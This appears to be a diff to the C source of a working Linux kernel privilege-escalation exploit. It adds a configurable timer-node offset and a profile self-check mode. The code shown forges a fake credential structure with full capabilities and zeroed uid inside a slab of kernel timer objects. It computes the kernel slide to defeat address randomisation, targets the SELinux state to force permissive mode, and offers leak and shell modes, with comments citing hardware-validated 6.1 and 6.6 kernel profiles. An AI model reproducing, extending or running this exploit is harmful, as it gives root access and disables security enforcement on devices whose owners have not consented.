@@ -139,6 +139,8 @@ struct target_profile
     int cred_cap_count;
     /* Build-specific pieces that used to be #defines. */
     unsigned long long timer_alloc;
+    /* Offset of the cpu_timer rb node inside struct k_itimer (BTF). */
+    unsigned long long timer_node_off;
     unsigned long long task_alloc_bytes;
     unsigned long long fullcap;
     unsigned long long selinux_blob_off;
@@ -176,6 +178,7 @@ static char g_kernel[256] = "unknown";
 
 /* cred_jar: sizeof(struct cred) and kmem_cache size, from BTF. */
 #define TIMER_ALLOC (g_tgt->timer_alloc)
+#define TIMER_NODE_OFF (g_tgt->timer_node_off)
 #define CRED_REQ (g_tgt->cred_req)
 #define CRED_ALLOC (g_tgt->cred_alloc)
 #define CRED_SIZE (g_tgt->cred_size)
@@ -263,6 +266,7 @@ static void conf_defaults(void)
     g_cfg.cred_cap_count = 5;
     g_cfg.fake_cred_off = 0x18;
     g_cfg.timer_alloc = 0x108;
+    g_cfg.timer_node_off = 0x78;
     g_cfg.task_alloc_bytes = 0x12c0;
     g_cfg.fullcap = 0x1ffffffffffULL;
     g_cfg.selinux_blob_off = 0x0;
@@ -325,6 +329,7 @@ static void parse_conf_line(char *line)
 
     if (!strcmp(key, "timer_site")) g_cfg.static_timer_site = num;
     else if (!strcmp(key, "timer_alloc")) g_cfg.timer_alloc = num;
+    else if (!strcmp(key, "timer_node_off")) g_cfg.timer_node_off = num;
     else if (!strcmp(key, "cred_req")) g_cfg.cred_req = num;
     else if (!strcmp(key, "cred_alloc")) g_cfg.cred_alloc = num;
     else if (!strcmp(key, "cred_size")) g_cfg.cred_size = num;
@@ -434,6 +439,97 @@ static int load_conf(const char *path)
     base = strrchr(path, '/');
     snprintf(g_cfg.name, sizeof(g_cfg.name), "%s", base ? base + 1 : path);
     return 0;
+}
+
+/*
+ * F6 profile invariants.  Every one of these is a property of the conf file,
+ * not of the running device, so a failure here means the profile itself is
+ * wrong.  Nothing in this function touches the kernel.
+ */
+static void logf(const char *fmt, ...);
+
+static int selfcheck_profile(void)
+{
+    int bad = 0;
+    unsigned long long ss = SLAB_SIZE;
+
+    logf("[selfcheck] profile=%s release=%s\n", g_cfg.name, g_cfg.release);
+
+#define CHECK(cond, fmt, ...)                                   \
+    do                                                          \
+    {                                                           \
+        if (cond)                                               \
+            logf("[selfcheck] ok   " fmt "\n", ##__VA_ARGS__);    \
+        else                                                    \
+        {                                                       \
+            logf("[selfcheck] FAIL " fmt "\n", ##__VA_ARGS__);    \
+            bad++;                                              \
+        }                                                       \
+    } while (0)
+
+    CHECK(ss == ((unsigned long long)PAGE << SLAB_ORDER),
+          "slab_size %#llx == page_size << slab_order (%#llx)",
+          ss, (unsigned long long)PAGE << SLAB_ORDER);
+    CHECK(TIMER_SITE_LOW21 == (STATIC_TIMER_SITE & 0x1fffffULL),
+          "timer_site_low21 %#llx == timer_site & 0x1fffff",
+          (unsigned long long)TIMER_SITE_LOW21);
+    CHECK(COPY_PROCESS_LOW21 && COPY_PROCESS_LOW21 < 0x200000ULL,
+          "copy_process_low21 %#llx fits in 21 bits",
+          (unsigned long long)COPY_PROCESS_LOW21);
+    CHECK(CRED_UID_OFF == 4 || CRED_UID_OFF == 8,
+          "cred_uid_off %#llx is the cred.usage width (4 or 8)",
+          (unsigned long long)CRED_UID_OFF);
+    CHECK(FAKE_CRED_OFF == 0x18,
+          "fake_cred_off %#llx == 0x18", (unsigned long long)FAKE_CRED_OFF);
+    CHECK(FAKE_CAPS_OFF >= 0x28,
+          "fake_caps_off %#llx >= 0x28 (c[5] overlay must not hit securebits)",
+          (unsigned long long)FAKE_CAPS_OFF);
+    CHECK(CRED_REQ < CRED_ALLOC,
+          "cred_req %#llx < cred_alloc %#llx",
+          (unsigned long long)CRED_REQ, (unsigned long long)CRED_ALLOC);
+    CHECK(FAKE_CRED_OFF + CRED_SIZE <= ss - TIMER_NODE_OFF,
+          "fake_cred_off + cred_size (%#llx) <= slab_size - node_off (%#llx)",
+          (unsigned long long)(FAKE_CRED_OFF + CRED_SIZE),
+          (unsigned long long)(ss - TIMER_NODE_OFF));
+    /*
+     * linear_min/linear_max bound the *direct map* on this VA layout, and
+     * the kernel image is mapped above it: plant_base() votes a base inside
+     * this window, then g_slide = site0 - timer_site maps that vote back to
+     * the image.  So timer_site must NOT be inside the window -- it has to
+     * sit above linear_max, which is what keeps the two address spaces from
+     * being confused.  (Checked against the hardware-validated 6.1.162 and
+     * 6.6.127 profiles: timer_site > linear_max on all of them.)
+     */
+    CHECK(LINEAR_MIN < LINEAR_MAX && STATIC_TIMER_SITE >= LINEAR_MAX,
+          "linear_min %#llx < linear_max %#llx <= timer_site %#llx "
+          "(image above direct map)",
+          (unsigned long long)LINEAR_MIN,
+          (unsigned long long)LINEAR_MAX,
+          (unsigned long long)STATIC_TIMER_SITE);
+    CHECK(TIMER_ALLOC && TIMER_ALLOC <= ss,
+          "timer_alloc %#llx <= slab_size %#llx",
+          (unsigned long long)TIMER_ALLOC, ss);
+    /*
+     * Worst case: the victim is the last object in the slab.  A profile that
+     * overflows here still works because run_plant() retries when the fake
+     * cred would spill, but say so explicitly instead of hiding it.
+     */
+    if (TIMER_ALLOC)
+    {
+        unsigned long long maxoff =
+            ((ss - TIMER_ALLOC) / TIMER_ALLOC) * TIMER_ALLOC;
+        unsigned long long end =
+            maxoff + TIMER_NODE_OFF + FAKE_CRED_OFF + CRED_SIZE;
+
+        logf("[selfcheck] info last object node=%#llx cred_end=%#llx slab=%#llx"
+             " (%s)\n", maxoff + TIMER_NODE_OFF, end, ss,
+             end <= ss ? "fits" : "spills -> run_plant retries");
+    }
+#undef CHECK
+
+    logf("[selfcheck] %s (%d failure%s)\n", bad ? "FAILED" : "ok", bad,
+         bad == 1 ? "" : "s");
+    return bad;
 }
 
 #define CHILD_HELLO 0x52445931
@@ -1789,7 +1885,7 @@ static void run_plant(unsigned long long target, int tag, int mode,
         target = SELINUX_STATE_STATIC + g_slide - 7;
 
     {
-        size_t off = (size_t)((V & SLAB_OFF_MASK) + 0x78);
+        size_t off = (size_t)((V & SLAB_OFF_MASK) + TIMER_NODE_OFF);
 
         payload = malloc(SOCKBUF);
         if (!payload)
@@ -1879,7 +1975,7 @@ static void run_plant(unsigned long long target, int tag, int mode,
              * uid is repaired by the later zero write at fake+CRED_UID_OFF;
              * euid and the caps are never touched by the erase.
              */
-            build_payload(payload, off, V + 0x78 + FAKE_CRED_OFF, target);
+            build_payload(payload, off, V + TIMER_NODE_OFF + FAKE_CRED_OFF, target);
             c[0] = 0x0000000000000001ULL; /* usage=1 */
             c[1] = 0; /* uid/gid (6.6) or gid/suid (6.1) */
             c[2] = 0; /* suid/sgid or sgid/euid */
@@ -1917,8 +2013,8 @@ static void run_plant(unsigned long long target, int tag, int mode,
         logf("[+] plant%d mode=%s V=%#llx node=%#llx fake=%#llx target=%#llx "
              "pfn=%#llx slab=%#llx slide=%#llx recs=%d slab_own=%d "
              "base=%#llx\n",
-             tag, mode == 2 ? "fake" : "zero", V, V + 0x78,
-             mode == 2 ? V + 0x78 + FAKE_CRED_OFF : 0, target,
+             tag, mode == 2 ? "fake" : "zero", V, V + TIMER_NODE_OFF,
+             mode == 2 ? V + TIMER_NODE_OFF + FAKE_CRED_OFF : 0, target,
              pfn, slab_pfn, g_slide, nrec, slab_own, g_base);
     }
 
@@ -2081,12 +2177,12 @@ static void run_plant(unsigned long long target, int tag, int mode,
 
     usleep(1000);
     logf("[+] plant%d reaping T=%d node=%#llx mode=%s payload_off=%#zx "
-         "target=%#llx\n", tag, T, V + 0x78, mode == 2 ? "fake" : "zero",
-         (size_t)((V & SLAB_OFF_MASK) + 0x78), target);
+         "target=%#llx\n", tag, T, V + TIMER_NODE_OFF, mode == 2 ? "fake" : "zero",
+         (size_t)((V & SLAB_OFF_MASK) + TIMER_NODE_OFF), target);
     int st = 0;
     waitpid(T, &st, 0);
     logf("[+] plant%d reaped status=%#x\n", tag, st);
-    res->A = mode == 2 ? V + 0x78 + FAKE_CRED_OFF : V + 0x78;
+    res->A = mode == 2 ? V + TIMER_NODE_OFF + FAKE_CRED_OFF : V + TIMER_NODE_OFF;
     res->ok = 1;
     logf("[+] plant%d write mode=%s target=%#llx\n", tag,
          mode == 2 ? "fake" : "zero", target);
@@ -2179,7 +2275,7 @@ static void run_probe(unsigned char *raw)
             vslab = V & SLAB_MASK;
             logf("[probe] V=%#llx off=%#llx node_off=%#llx fake=%#llx "
                  "mod264=%llu mod256=%llu\n", V, V & SLAB_OFF_MASK,
-                 (V & SLAB_OFF_MASK) + 0x78, (V & SLAB_OFF_MASK) + 0x90,
+                 (V & SLAB_OFF_MASK) + TIMER_NODE_OFF, (V & SLAB_OFF_MASK) + TIMER_NODE_OFF + 0x18,
                  (V & SLAB_OFF_MASK) % 264, (V & SLAB_OFF_MASK) % 256);
             if (pair_slab_pfn(raw, (size_t)n, etid, vslab, &pfn))
                 logf("[probe] pair pfn=%#llx pair_base=%#llx agree=%d\n",
@@ -2484,7 +2580,7 @@ static void print_usage(const char *argv0)
 {
     fprintf(stderr,
             "usage: %s --conf <conf> [--protocol N]"
-            " [ids|leak|shell|fake|permissive] [target|probe|cpu N]\n",
+            " [ids|leak|shell|fake|permissive] [target|selfcheck|probe|cpu N]\n",
             argv0 ? argv0 : "timer");
 }
 
@@ -2620,6 +2716,8 @@ int main(int argc, char **argv)
 
     /* Lets the app confirm a downloaded binary targets this exact build.
      * Keep target=lynx for the app's existing check. */
+    if (mode && !strcmp(mode, "selfcheck"))
+        return selfcheck_profile() ? 1 : 0;
     if (mode && !strcmp(mode, "target"))
     {
         printf("target=lynx\ndevice=%s\nkernel=%s\npagesize=%lu\n"
